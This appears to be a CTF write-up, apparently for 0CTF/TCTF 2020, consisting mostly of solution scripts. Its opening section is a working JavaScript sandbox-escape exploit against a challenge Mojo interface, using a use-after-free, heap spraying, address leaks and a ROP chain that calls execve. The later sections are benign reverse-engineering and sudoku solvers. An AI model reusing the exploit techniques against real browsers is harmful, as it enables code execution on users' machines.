<!DOCTYPE html>
<html>
<head>
<script type="text/javascript" src="/mojo_bindings.js"></script>
<script type="text/javascript" src="/third_party/blink/public/mojom/tstorage/tstorage.mojom.js"></script>

<script type="text/javascript">
const hex = (x) => ("0x" + x.toString(16));
const print = console.log;
const refs = [];
const tInsPtrSprays = [];
const tInsPtrSprays2 = [];
async function createSprayObjects(tInsPtrSprays)
{
    const tStrPtrSpray = new blink.mojom.TStoragePtr();
    Mojo.bindInterface(blink.mojom.TStorage.name,
        mojo.makeRequest(tStrPtrSpray).handle, 'context', true);
    await tStrPtrSpray.init();
    const tInsPtr = (await tStrPtrSpray.createInstance()).instance;
    tInsPtrSprays.push(tInsPtr);
    refs.push(tStrPtrSpray);
}

// 10 -> True, True, True, True, True, True, True, True, True, True, True, False, True, True, False, True, True, False, True, True, True, True, True, True,
// 12 15 18 22 27 33 41 51 63 78 97 60 75 93 57 71 88 55 68 85 106 132 165 206

async function sprayQueue(tInsPtrSprays, val=0x41414141)
{
    let i = 0;
    for (const tInsPtr of tInsPtrSprays)
    {
        for (let i = 0; i < 97; i++)
            await tInsPtr.push(val);
        for (let i = 0; i < 49; i++)
            await tInsPtr.pop();
        // current capacity: 60, current size: 48
        for (let i = 0; i < 93 - 48; i++)
            await tInsPtr.push(val);
        for (let i = 0; i < 47; i++)
            await tInsPtr.pop();
        // current capacity: 57, current size: 46
        for (let i = 0; i < 88 - 46; i++)
            await tInsPtr.push(val);
        for (let i = 0; i < 44; i++)
            await tInsPtr.pop();
        // current capacity: 55, current size: 44
        for (let i = 0; i < 206 - 44 - 1; i++)
            await tInsPtr.push(0);
        await tInsPtr.push(i);
        // int_value_
        i++;

        // console.log(await tInsPtr.getTotalSize());
    }
}

async function main()
{
for (let i = 0; i < 0x10; i++)
{
    await createSprayObjects(tInsPtrSprays);
    await createSprayObjects(tInsPtrSprays2);
}
print("spray init done");

const tStrPtr = new blink.mojom.TStoragePtr();
Mojo.bindInterface(blink.mojom.TStorage.name,
    mojo.makeRequest(tStrPtr).handle,
    'context', true);
await tStrPtr.init();
const tInsPtr = (await tStrPtr.createInstance()).instance;
await tStrPtr.init();

print("UAF done");
await sprayQueue(tInsPtrSprays);
print("spray done");
// for (let i = 0; i < uafs.length; i++)
//  print(hex((await uafs[i].get(2)).value));
// for (let i = 0; i < 0x100; i++) {
//  await uafs[i].setInt(0x13372019 + i);
// }
// for (let i = 0; i < uafs.length; i++)
//  print(hex((await uafs[i].getInt()).value));
const libcAddr = (await tStrPtr.getLibcAddress()).addr - 0x40680;
const textAddr = (await tStrPtr.getTextAddress()).addr - 0x39b5e60;

// rop and fake virtual table
// 0xd1ba7: lea rdi, [rsp + 0xb0]; mov rsi, rbp; call rbx
// 0x52bc8: pop rbp; pop rbx; ret;
// 0x2cb49: pop rbx; ret;
// 0x1b96: pop rdx; ret;
// 0x439c8: pop rax; ret;
await tInsPtr.push(libcAddr + 0x52bc8); // begin of ROP
await tInsPtr.push(0); // let queue to have some element
await tInsPtr.push(textAddr + 0x3fa5114); // xchg rsp,rax, as virtual table
await tInsPtr.push(libcAddr + 0x2cb49);
await tInsPtr.push(libcAddr + 0xe4e30); // execve

await tInsPtr.push(libcAddr + 0x1b96);
await tInsPtr.push(0); // rdx = 0

await tInsPtr.push(libcAddr + 0xd1ba7);


for (let i = 0; i < 0x10; i++) {
    await tInsPtr.push([0x6c662f2e, 0x705f6761]);
    await tInsPtr.push(0x7265746e6972)
}

const idx = (await tInsPtr.getInt()).value;
print(idx);
for (let i = 0; i < 201; i++)
    await tInsPtrSprays[idx].pop();
const heapAddr = (await tInsPtrSprays[idx].pop()).value;
// pop element to leak the address of heap
// now 0x678 is freed again due to poping elements
print(hex(heapAddr));

await sprayQueue(tInsPtrSprays2, heapAddr);
print(hex(libcAddr))
print(hex(textAddr));

await tInsPtr.getTotalSize();
}
main();

//
</script>
<!-- <script>window.location = "http://192.144.212.163:8000/dajbnkcnamlskdm.html"</script> -->
</head>
</html>
```

## flash-1
```python=
from struct import pack

buf = open('flash', 'rb').read()

tbl = {
0x800005a0: 0x80002920,
0x800005b0: 0x80002934,
0x800005cc: 0x80002948,
0x800005ec: 0x8000295c,
0x80000610: 0x80002970,
0x80000620: 0x80002984,
0x80000630: 0x80002998,
0x80000648: 0x800029ac,
0x80000660: 0x800029c0,
0x80000670: 0x800029d4,
0x80000690: 0x800029e8,
0x800006bc: 0x800029fc,
0x800006cc: 0x80002a10,
0x800006e0: 0x80002a24,
0x80000700: 0x80002a38,
0x80000738: 0x80002a4c,
0x80000748: 0x80002a60,
0x8000078c: 0x80002a74,
0x800007c8: 0x80002a88,
0x80000814: 0x80002a9c,
0x80000834: 0x80002ab0,
0x80000878: 0x80002ac4,
0x80000898: 0x80002ad8,
0x800008a4: 0x80002aec,
0x800008b4: 0x80002b00,
0x800008d8: 0x80002b14,
0x800008e4: 0x80002b28,
0x800008f0: 0x80002b3c,
0x80000900: 0x80002b50,
0x80000924: 0x80002b64,
0x80000930: 0x80002b78,
0x8000093c: 0x80002b8c,
0x8000094c: 0x80002ba0,
0x80000978: 0x80002bb4,
0x80000984: 0x80002bc8,
0x800009b8: 0x80002bdc,
0x800009c4: 0x80002bf0,
0x800009d0: 0x80002c04,
0x800009e0: 0x80002c18,
0x80000a08: 0x80002c2c,
0x80000a14: 0x80002c40,
0x80000a20: 0x80002c54,
0x80000a30: 0x80002c68,
0x80000a5c: 0x80002c7c,
0x80000a68: 0x80002c90,
0x80000aa4: 0x80002ca4,
0x80000ab8: 0x80002cb8,
0x80000af4: 0x80002ccc,
0x80000b30: 0x80002ce0,
0x80000b44: 0x80002cf4,
0x80000b80: 0x80002d08,
0x80000ba0: 0x80002d1c,
0x80000bc8: 0x80002d30,
0x80000c0c: 0x80002d44,
0x80000c18: 0x80002d58,
0x80000c34: 0x80002d6c,
0x80000c40: 0x80002d80,
0x80000c4c: 0x80002d94,
0x80000c64: 0x80002da8,
0x80000c70: 0x80002dbc,
0x80000c7c: 0x80002dd0,
0x80000c90: 0x80002de4,
0x80000ca4: 0x80002df8,
0x80000cc8: 0x80002e0c,
0x80000d2c: 0x80002e20,
0x80000d50: 0x80002e34,
0x80000d64: 0x80002e48,
0x80000d74: 0x80002e5c,
0x80000d8c: 0x80002e70,
0x80000db8: 0x80002e84,
0x80000dc4: 0x80002e98,
0x80000de8: 0x80002eac,
0x80000e18: 0x80002ec0,
0x80000e50: 0x80002ed4,
0x80000e5c: 0x80002ee8,
0x80000e70: 0x80002efc,
0x80000e84: 0x80002f10,
0x80000e90: 0x80002f24,
0x80000ea0: 0x80002f38,
0x80000eb8: 0x80002f4c,
0x80000ed8: 0x80002f60,
0x80000f08: 0x80002f74,
0x80000f3c: 0x80002f88,
0x80000f78: 0x80002f9c,
0x80000fcc: 0x80002fb0,
0x80001014: 0x80002fc4,
0x80001098: 0x80002fd8,
0x800010d8: 0x80002fec,
0x800010f8: 0x80003000,
0x80001118: 0x80003014,
0x8000112c: 0x80003028,
0x80001150: 0x8000303c,
0x80001178: 0x80003050,
0x80001198: 0x80003064,
0x800011bc: 0x80003078,
0x800011dc: 0x8000308c,
0x80001204: 0x800030a0,
0x80001238: 0x800030b4,
0x80001248: 0x800030c8,
0x80001278: 0x800030dc,
0x800012b4: 0x800030f0,
0x800012dc: 0x80003104,
0x80001310: 0x80003118,
0x80001320: 0x8000312c,
0x8000134c: 0x80003140,
0x80001384: 0x80003154,
0x800013c4: 0x80003168,
0x800013d4: 0x8000317c,
0x800013e8: 0x80003190,
0x8000140c: 0x800031a4,
0x80001420: 0x800031b8,
0x80001444: 0x800031cc,
0x80001474: 0x800031e0,
0x800014a4: 0x800031f4,
0x800014b0: 0x80003208,
0x800014c8: 0x8000321c,
0x800014e4: 0x80003230,
0x80001514: 0x80003244,
0x80001534: 0x80003258,
0x8000157c: 0x8000326c,
0x8000159c: 0x80003280,
0x800015d0: 0x80003294,
0x800015dc: 0x800032a8,
0x800015f4: 0x800032bc,
0x80001618: 0x800032d0,
0x80001664: 0x800032e4,
0x80001684: 0x800032f8,
0x80001698: 0x8000330c,
0x800016ac: 0x80003320,
0x800016ec: 0x80003334,
0x800016fc: 0x80003348,
0x80001714: 0x8000335c,
0x80001734: 0x80003370,
0x80001744: 0x80003384,
0x80001754: 0x80003398,
0x80001768: 0x800033ac,
0x8000177c: 0x800033c0,
0x80001798: 0x800033d4,
0x800017b0: 0x800033e8,
0x800017d8: 0x800033fc,
0x800017e4: 0x80003410,
0x80001800: 0x80003424,
0x80001814: 0x80003438,
0x80001834: 0x8000344c,
0x80001854: 0x80003460,
0x80001860: 0x80003474,
0x80001880: 0x80003488,
0x8000188c: 0x8000349c,
0x800018a8: 0x800034b0,
0x800018c0: 0x800034c4,
0x800018d4: 0x800034d8,
0x800018e8: 0x800034ec,
0x80001904: 0x80003500,
0x80001920: 0x80003514,
0x8000193c: 0x80003528,
0x80001948: 0x8000353c,
0x80001958: 0x80003550,
0x80001968: 0x80003564,
0x80001978: 0x80003578,
0x80001990: 0x8000358c,
0x8000199c: 0x800035a0,
0x800019b4: 0x800035b4,
0x800019dc: 0x800035c8,
0x800019ec: 0x800035dc,
0x80001a08: 0x800035f0,
0x80001a14: 0x80003604,
0x80001a2c: 0x80003618,
0x80001a48: 0x8000362c,
0x80001a54: 0x80003640,
0x80001a6c: 0x80003654,
0x80001a88: 0x80003668,
0x80001aa0: 0x8000367c,
0x80001ae0: 0x80003690,
0x80001af8: 0x800036a4,
0x80001b10: 0x800036b8,
0x80001b3c: 0x800036cc,
0x80001b54: 0x800036e0,
0x80001b98: 0x800036f4,
0x80001ba4: 0x80003708,
0x80001bbc: 0x8000371c,
0x80001bc8: 0x80003730,
0x80001be0: 0x80003744,
0x80001bf8: 0x80003758,
0x80001c20: 0x8000376c,
0x80001c30: 0x80003780,
0x80001c58: 0x80003794,
0x80001c98: 0x800037a8,
0x80001cb8: 0x800037bc,
0x80001cf8: 0x800037d0,
0x80001d1c: 0x800037e4,
0x80001d3c: 0x800037f8,
0x80001d5c: 0x8000380c,
0x80001d70: 0x80003820,
0x80001d80: 0x80003834,
0x80001da0: 0x80003848,
0x80001dcc: 0x8000385c,
0x80001dd8: 0x80003870,
0x80001e04: 0x80003884,
0x80001e1c: 0x80003898,
0x80001e28: 0x800038ac,
0x80001e54: 0x800038c0,
0x80001e9c: 0x800038d4,
0x80001eb8: 0x800038e8,
0x80001ed8: 0x800038fc,
0x80001f0c: 0x80003910,
0x80001f20: 0x80003924,
0x80001f50: 0x80003938,
0x80001f74: 0x8000394c,
0x80001f94: 0x80003960,
0x80001fb8: 0x80003974,
0x80001fe0: 0x80003988,
0x80002008: 0x8000399c,
0x8000201c: 0x800039b0,
0x80002040: 0x800039c4,
0x80002078: 0x800039d8,
0x800020bc: 0x800039ec,
0x800020d8: 0x80003a00,
0x80002108: 0x80003a14,
0x80002144: 0x80003a28,
0x80002160: 0x80003a3c,
0x80002194: 0x80003a50,
0x800021b0: 0x80003a64,
0x800021d4: 0x80003a78,
0x80002214: 0x80003a8c,
0x80002228: 0x80003aa0,
0x80002238: 0x80003ab4,
0x80002248: 0x80003ac8,
0x80002258: 0x80003adc,
0x80002288: 0x80003af0,
0x800022bc: 0x80003b04,
0x800022e0: 0x80003b18,
0x80002334: 0x80003b2c,
0x80002354: 0x80003b40,
0x8000237c: 0x80003b54,
0x8000238c: 0x80003b68,
0x800023a0: 0x80003b7c,
0x800023b4: 0x80003b90,
0x800023d8: 0x80003ba4,
0x800023ec: 0x80003bb8,
0x80002400: 0x80003bcc,
0x80002424: 0x80003be0,
0x80002438: 0x80003bf4,
0x8000244c: 0x80003c08,
0x80002470: 0x80003c1c,
0x80002480: 0x80003c30,
0x8000249c: 0x80003c44,
0x800024cc: 0x80003c58,
0x800024dc: 0x80003c6c,
0x80002500: 0x80003c80,
0x80002534: 0x80003c94,
0x80002540: 0x80003ca8,
0x80002574: 0x80003cbc,
0x80002580: 0x80003cd0,
0x80002590: 0x80003ce4,
0x800025e0: 0x80003cf8,
0x80002600: 0x80003d0c,
}

p = 0x10000
while True:
    q = buf.find(bytes.fromhex('408048001000FFFF'), p)
    if q == -1:
        break

    q += 4
    fr = q - 0x10000 + 0x80000000
    assert fr in tbl
    to = tbl[fr]

    off = (to - (fr + 4)) // 4

    patch = pack('>H', off)

    # buf[q + 2:q + 4] = patch
    buf = buf[:q + 2] + patch + buf[q + 4:]

    assert off < 0x10000

open('flashp', 'wb').write(buf)
    
```

```python=

code = bytearray.fromhex('0009091D00090000000A00050006001400090001000A0001000B0008000900010006FFE00009001100020009B2480003000972A90005000701440009001100020009B24800030009097E00050007012E0009001100020009B2480003000955600005000701180009001100020009B248000300094CA10005000701020009001100020009B2480003000900370005000700EC0009001100020009B24800030009AA710005000700D60009001100020009B24800030009122C0005000700C00009001100020009B2480003000945360005000700AA0009001100020009B2480003000911E80005000700940009001100020009B24800030009124700050007007E0009001100020009B2480003000976C70005000700680009001100020009B24800030009096D0005000700520009001100020009B24800030009122C00050007003C0009001100020009B2480003000987CB0005000700260009001100020009B2480003000909E40005000700100009091D0007000800090000000B000D00090001000B000D')

simple = ['add', 'sub', 'mul', 'mod', 'lt', 'eq']
pc = 0

def gw():
    global pc
    v = (code[pc] << 8) | (code[pc + 1])
    pc += 2
    return v

while pc < len(code):
    pc0 = pc
    op = gw()
    ops = ''
    if op < len(simple):
        mn = simple[op]
    elif op in [6, 7]:
        mn = {6:'jx', 7:'jnx'}[op]
        opr = gw()
        dst = (pc + opr) % 0x10000
        ops = '{:04x}'.format(dst)
        assert pc % 2 == 0 and opr % 2 == 0
        
    elif op == 8:
        mn = 'flag'
    elif op == 9:
        opr = gw()
        mn = 'imm'
        ops = '{:04x}'.format(opr)
    elif op == 10:
        mn = 'gln'
    elif op == 11:
        mn = 'sln'
    elif op == 12:
        mn = 'drop'
    elif op == 13:
        mn = 'hlt'

    print(f'{pc0:04x}     {mn:<5s}   {ops}'.rstrip())
```

```python=
from Crypto.Util.number import inverse

d = inverse(0x11, 0xb248)

def f(a):
    return (a * d % 0xb248)

arr = [
0x72a9,
0x097e,
0x5560,
0x4ca1,
0x0037,
0xaa71,
0x122c,
0x4536,
0x11e8,
0x1247,
0x76c7,
0x096d,
0x122c,
0x87cb,
0x09e4,
]

from struct import pack
s = b''
for c in arr:
    s += pack("<H", f(c))
print(s[::-1])


```

## j

```python=

from capstone import *
from capstone.x86_const import *
control = [0x43200CC0, 0x856A19E4, 0x048A1FA1, 0x05002064, 0x04D82290, 0x04002432, 0x046024B3, 0x8D402534, 0x048A2771, 0x04002790, 0x8D402864, 0x83482AF3, 0x8D842BA4, 0x07E83761, 0x885C37D4, 0x083A3D60, 0x06F03F22, 0x07C03F93, 0x8D604004, 0x07E84271, 0x46F04290, 0x8D604334, 0x09E84A41, 0x0A544AB4, 0x0A324D50, 0x094C4F22, 0x09C04F93, 0x8D805004, 0x09E85231, 0x494C5250, 0x8D8052F4, 0x0C8A5FB1, 0x0CEE6034, 0x0CD06260, 0x0BFA6432, 0x0C6064B3, 0x0D206534, 0x0C8A6731, 0x0BFA6750, 0x81A267D3, 0x0D206900, 0x0D406A00, 0x0D606B00, 0x0D806C00, 0x0E606C74, 0x8F6A71B1, 0x0E987210, 0x0E607300, 0x0F6A74A1, 0x0F9C7524, 0x0E7E79D0, 0x0E987B32, 0x0F407BB3, 0x8E647C33, 0x52007C90, 0x92007D44, 0x12009000]

dic = {}
for i in control:
    jcc = i & 0xF
    off = (i >> 4) & 0x1FFF
    ln  = i >> 30
    dst = (i >> 17) & 0x1FFF

    dic[off] = (jcc, ln, dst)

buf = open('code2', 'rb').read()

cs = Cs(CS_ARCH_X86, CS_MODE_64)
cs.detail = True

g = cs.disasm(buf, 0)

xxx = []
dis = ''
while True:
    try:
        insn = next(g)
    except StopIteration:
        break
    pc = insn.address
    dis += f'loc_{pc:08x}:\n'
    if insn.id == X86_INS_INT3:
        jcc, ln, dst = dic[pc]
        t = {0:'jmp', 1:'jle', 2:'jg', 3:'jz', 4:'jnz'}[jcc]
        l = {0:2, 1:5, 2:6}[ln]
        n = pc + l
        dis += f'{t:<10s} loc_{dst:08x}\n'
        g = cs.disasm(buf[n:], n)
    else:
        dis += f'{insn.mnemonic:<10s} {insn.op_str}\n'

dis += f'loc_{0x900:08x}:\n'

for i in xxx:
    assert i in dis
    print(i)
open('dis.asm', 'w').write(dis)

from keystone import *

ks = Ks(KS_ARCH_X86, KS_MODE_64)

code, ln = ks.asm(dis, 0)
code = bytearray(code)
open('code2r', 'wb').write(code)
```

```python=

def bswap(a):
    hi = a >> 8
    lo = a & 0xFF
    return (lo << 8) | hi

def word(buf, i):
    return (buf[i] << 8) | buf[i + 1]

def sub(a, b):
    return (a + 0x10000 - b) & 0xFFFF

def add(a, b):
    return (a + b) & 0xFFFF

key = [
0x43, 0x54, 0x46, 0x54, 0x51, 0x5F, 0x41, 0x55, 0x53, 0x4C, 0x32, 0x5F, 0x32, 0x30, 0x5F, 0x30,
0xBE, 0x8C, 0xAA, 0xA2, 0x98, 0x82, 0xBE, 0xA6, 0x60, 0x64, 0x60, 0x64, 0xA8, 0xBE, 0xA8, 0x86,
0x05, 0x55, 0x4D, 0x31, 0xC8, 0x7C, 0xC8, 0xC0, 0x7D, 0xC1, 0x0D, 0x51, 0x19, 0x51, 0x45, 0x7D,
0xF9, 0x9A, 0x81, 0x91, 0x82, 0x91, 0xA2, 0xFA, 0xA2, 0x1A, 0xFA, 0x32, 0xAA, 0x8A, 0x62, 0x0A,
0x23, 0x03, 0xF5, 0x05, 0x35, 0x44, 0x65, 0x44, 0x15, 0xF5, 0x14, 0x54, 0x35, 0xC5, 0x23, 0xF3,
0x88, 0xEA, 0x88, 0x6A, 0xEA, 0xCB, 0xA8, 0x2A, 0x8A, 0x29, 0xE6, 0x6B, 0x06, 0x46, 0x0B, 0x46,
0x97, 0x11, 0x55, 0xD4, 0x53, 0x50, 0xD7, 0x14, 0x8B, 0x48, 0xAB, 0x2B, 0xAD, 0xAF, 0x2A, 0x28,
0x06, 0x46, 0x0B, 0x46, 0x3B, 0xF7, 0x76, 0xD6, 0x58, 0xD5, 0x2F, 0xDD, 0x88, 0xEA, 0x88, 0x6A,
0xAC, 0xF7, 0xCB, 0x3A, 0xEC, 0xAB, 0x4A, 0x2B, 0x35, 0x44, 0x65, 0x44, 0x61, 0xB9, 0xDD, 0xFC,
0x9E, 0xF5, 0x0F, 0x65, 0xA2, 0x1A, 0xFA, 0x32, 0x4F, 0xC4, 0x7E, 0x6E, 0x7F, 0x6E, 0x3F, 0x12,
0x19, 0x51, 0x45, 0x7D, 0x6A, 0x47, 0x83, 0x3E, 0x38, 0x3F, 0xC5, 0x9A, 0x05, 0x55, 0x4D, 0x31,
0x11, 0x6C, 0x58, 0x41, 0xA0, 0x9B, 0xBD, 0x8C, 0x98, 0x82, 0xBE, 0xA6, 0xE7, 0x5A, 0x42, 0x73,
0xA1, 0xCF, 0x95, 0x43, 0x53, 0x4C, 0x32, 0x5F, 0xD4, 0xBD, 0xBA, 0xAB, 0xAF, 0xA0, 0x21, 0x04
]
k = [(key[i + 1] << 8) | key[i] for i in range(0, len(key), 2)]
p = [0 for i in range(4)]

def f1(a, b):
    t = a * b
    hi = (t >> 16) & 0xFFFF
    lo = t & 0xFFFF
    o = (lo << 16) | hi
    return (((o + (1 << 32) - t) & ((1 << 32) - 1)) >> 16) + 1


def f2(a, b):
    r = []
    for i in range(0x10000):
        if f1(i, b) == a:
            r.append(i)
    assert len(r) != 0
    return r[0]

arr = [
0xEF28DD7F, 0x5078615A,
0x955A0F80, 0x15682E55,
0x538F435E, 0xE71BCEEE,
0x5675A3E5, 0x7BF39DAD,
]
s = b''
for j in range(0, 8, 2):
    r0 = arr[j]
    r1 = arr[j + 1]
    kx = 48

    r0h = (r0 >> 16) & 0xFFFF
    r0l = r0 & 0xFFFF
    p[2] = sub(bswap(r0h), k[kx + 1])
    p[0] = f2(bswap(r0l), k[kx + 0])

    r1h = (r1 >> 16) & 0xFFFF
    r1l = r1 & 0xFFFF
    p[3] = f2(bswap(r1h), k[kx + 3])
    p[1] = sub(bswap(r1l), k[kx + 2])

    for i in range(8):
        kx -= 6

        t1 = f1(p[0] ^ p[1], k[kx + 4])
        t3 = f1(add(p[3] ^ p[2], t1), k[kx + 5])
        t4 = add(t1, t3)
        t0 = p[0] ^ t3
        u2 = p[1] ^ t3
        u1 = p[2] ^ t4
        t2 = p[3] ^ t4
        p[1] = sub(u1, k[kx + 1])
        p[2] = sub(u2, k[kx + 2])
        p[0] = f2(t0, k[kx + 0])
        p[3] = f2(t2, k[kx + 3])
        
    
    s += bytes.fromhex(f'{p[0]:04x}{p[1]:04x}{p[2]:04x}{p[3]:04x}')
print(s)
```

## w
```python=



buf = open('dmp', 'rb').read()

key = bytearray(0x20)

def once(idx, known):
    global key
    a = 0xFF
    for j in range(idx, idx + len(known)):
        c = j & 0x1F
        # b - c = known[j]
        b = c + known[j - idx]
        # b = a ^ key[c] ^ buf[j]
        if j != idx:
            key[c] = b ^ a ^ buf[j]
        a = buf[j]
    
known = bytes.fromhex('00 61 73 6D 01 00 00 00 01 62 0F 60 01 7F 01 7F60 03 7F 7F 7F 01 7F 60 03 7F 7E 7F 01 7E 60 01'.replace(' ', ''))

once(0, known)

known = b'wasi_snapshot_preview1.'
once(0x40, known)

known = b'Welcome to 0CTF/TCTF 2020! Have a g00d time'
once(0x4F32, known)
key[0] = ord('e')

print(key)

size = 0x5000
buf2 = bytearray(buf)
for i in range(size // 0x200):
    a = 0xFF
    for j in range(0x200):
        c = j & 0x1F
        b = a ^ key[c] ^ buf2[i * 512 + j]
        a = buf2[i * 512 + j]
        buf2[i * 512 + j] = (b + 0x100 - c) & 0xFF

open('dd', 'wb').write(buf2)
```

```
p = 22229
q = 227081
```

## babymips


逆完了是个数独

```
..8...7..
...1..8..
1.....6..
.3.8.5.6.
3........
6..21..78
5....8..7
4.1.....2
8......14
```

3x3规则改成了
```python
m = [0x00, 0x01, 0x02, 0x03, 0x0A, 0x0C, 0x0D, 0x0E, 0x13, 0x04, 0x05, 0x06, 0x0F, 0x18, 0x19, 0x21, 0x2A, 0x33, 0x07, 0x08, 0x10, 0x11, 0x1A, 0x22, 0x23, 0x2B, 0x34, 0x09, 0x12, 0x1B, 0x24, 0x2D, 0x36, 0x37, 0x3F, 0x48, 0x0B, 0x14, 0x15, 0x1C, 0x1D, 0x1E, 0x25, 0x2E, 0x27, 0x16, 0x17, 0x1F, 0x20, 0x28, 0x31, 0x3A, 0x42, 0x43, 0x26, 0x2F, 0x30, 0x38, 0x39, 0x40, 0x41, 0x49, 0x4A, 0x29, 0x32, 0x3B, 0x3C, 0x3D, 0x44, 0x4B, 0x4C, 0x4D, 0x2C, 0x35, 0x3E, 0x45, 0x46, 0x47, 0x4E, 0x4F, 0x50]
for i in range(9):
    for j in range(9):
        v = m[i * 9 + j]
        tmp[j] = x[v]
    check_unique(tmp)
```

解数独

```pascal
program sudoku;
const
  maxn=9*9*9;
  maxm=9*9*4;
  maxp=(maxn+1)*maxm;
  block:array [1..9,1..9] of integer
    = ((1, 1, 1, 1, 2, 2, 2, 3, 3),
       (4, 1, 5, 1, 1, 1, 2, 3, 3),
       (4, 1, 5, 5, 6, 6, 2, 2, 3),
       (4, 5, 5, 5, 6, 6, 2, 3, 3),
       (4, 5, 7, 5, 6, 8, 2, 3, 9),
       (4, 5, 7, 7, 6, 8, 2, 3, 9),
       (4, 4, 7, 7, 6, 8, 8, 8, 9),
       (4, 7, 7, 6, 6, 8, 9, 9, 9),
       (4, 7, 7, 8, 8, 8, 9, 9, 9));
        (*
       =((1,1,1,2,2,2,3,3,3),
         (1,1,1,2,2,2,3,3,3),
         (1,1,1,2,2,2,3,3,3),
         (4,4,4,5,5,5,6,6,6),
         (4,4,4,5,5,5,6,6,6),
         (4,4,4,5,5,5,6,6,6),
         (7,7,7,8,8,8,9,9,9),
         (7,7,7,8,8,8,9,9,9),
         (7,7,7,8,8,8,9,9,9));
         *)
type
  ptr=record
          up,down,left,right,num,n2:longint;
      end;
  sudoku_t=record
             x,y,k:integer;
           end;
var
  map:array [0..maxp] of ptr;
  size:longint;
  head:array [1..maxn] of longint;

function store(x,y,k:integer):longint;
begin
  exit((x-1)*9*9+(y-1)*9+k);
end;

function rstore(x:longint):sudoku_t;
var
  f:sudoku_t;
begin
  f.k:=(x-1) mod 9 +1;
  x:=(x-1) div 9;
  f.y:=x mod 9 +1;
  x:=x div 9;
  f.x:=x+1;
  exit(f);
end;

procedure addptr(x,y:longint);
var
  i:longint;
begin
  inc(size);
  map[size].n2:=x;
  map[size].up:=y;
  map[size].down:=map[y].down;
  map[size].num:=y;
  inc(map[y].num);
  map[map[y].down].up:=size;
  map[y].down:=size;
  if head[x]=0 then
  begin
    map[size].left:=size;
    map[size].right:=size;
    head[x]:=size;
  end
  else
  begin
    i:=head[x];
    while map[map[i].right].num>map[i].num do
      i:=map[i].right;
    map[size].left:=i;
    map[size].right:=map[i].right;
    map[map[i].right].left:=size;
    map[i].right:=size;
  end;
end;

procedure dellr(x:longint);
var
   i,j:integer;
begin
  dec(map[0].num);
  map[map[x].left].right:=map[x].right;
  map[map[x].right].left:=map[x].left;
  i:=map[x].down;
  while i<>x do
  begin
    j:=map[i].right;
    while j<>i do
    begin
      map[map[j].up].down:=map[j].down;
      map[map[j].down].up:=map[j].up;
      dec(map[map[j].num].num);
      j:=map[j].right;
    end;
    i:=map[i].down;
  end;
end;

procedure addlr(x:longint);
var
  j,i:integer;
begin
  inc(map[0].num);
  map[map[x].left].right:=x;
  map[map[x].right].left:=x;
  i:=map[x].down;
  while i<>x do
  begin
    j:=map[i].right;
    while j<>i do
    begin
      map[map[j].up].down:=j;
      map[map[j].down].up:=j;
      inc(map[map[j].num].num);
      j:=map[j].right;
    end;
    i:=map[i].down;
  end;
end;

var
  ansl:longint;
  ans:array [1..maxn] of longint;

procedure init;
var
  i,x,y,k,p:integer;
  c:char;
begin
  fillchar(map,sizeof(map),0);
  fillchar(head,sizeof(head),0);
  ansl:=0;
  size:=0;
  map[0].num:=maxm;
  for i:=1 to maxm do
  begin
    inc(size);
    map[size].up:=size;
    map[size].down:=size;
    map[size].left:=size-1;
    map[size].right:=map[size-1].right;
    map[map[size-1].right].left:=size;
    map[size-1].right:=size;
  end;
  for x:=1 to 9 do
    for y:=1 to 9 do
      for k:=1 to 9 do
      begin
        p:=store(x,y,k);
        addptr(p,(x-1)*9+k);
        addptr(p,81+(y-1)*9+k);
        addptr(p,162+(block[x,y]-1)*9+k);
        addptr(p,243+(x-1)*9+y);
      end;
  for x:=1 to 9 do
  begin
    for y:=1 to 9 do
    begin
      read(c);
      if c<>'0' then
      begin
        inc(ansl);
        ans[ansl]:=store(x,y,ord(c)-ord('0'));
        p:=head[ans[ansl]];
        dellr(map[p].num);
        i:=map[p].right;
        while i<>p do
        begin
          dellr(map[i].num);
          i:=map[i].right;
        end;
      end;
    end;
    readln;
  end;
end;

function work:boolean;
var
  i,p,j:longint;
  debug:sudoku_t;
begin
  if map[0].num=0 then
    exit(true);
  i:=map[0].right;
  p:=i;
  while i<>0 do
  begin
    if map[i].num<map[p].num then
      p:=i;
    i:=map[i].right;
  end;
  dellr(p);
  i:=map[p].down;
  while i<>p do
  begin
    inc(ansl);
    ans[ansl]:=map[i].n2;
    debug:=rstore(ans[ansl]);
    j:=map[i].right;
    while j<>i do
    begin
      dellr(map[j].num);
      j:=map[j].right;
    end;
    if work() then
      exit(true);
    j:=map[i].left;
    while j<>i do
    begin
      addlr(map[j].num);
      j:=map[j].left;
    end;
    dec(ansl);
    i:=map[i].down;
  end;
  addlr(p);
  exit(false);
end;

procedure print;
var
  a:array [1..9,1..9] of integer;
  i,j:longint;
  t:sudoku_t;
begin
  fillchar(a,sizeof(a),0);
  for i:=1 to ansl do
  begin
    t:=rstore(ans[i]);
    a[t.x,t.y]:=t.k;
  end;
  for i:=1 to 9 do
  begin
    for j:=1 to 9 do
      write(a[i,j]);
    writeln;
  end;
end;

var
  n:integer;
  fei:boolean;
begin
  readln(n);
  while n<>0 do
  begin
    dec(n);
    init;
    fei:=work;
    print;
  end;
end.
```
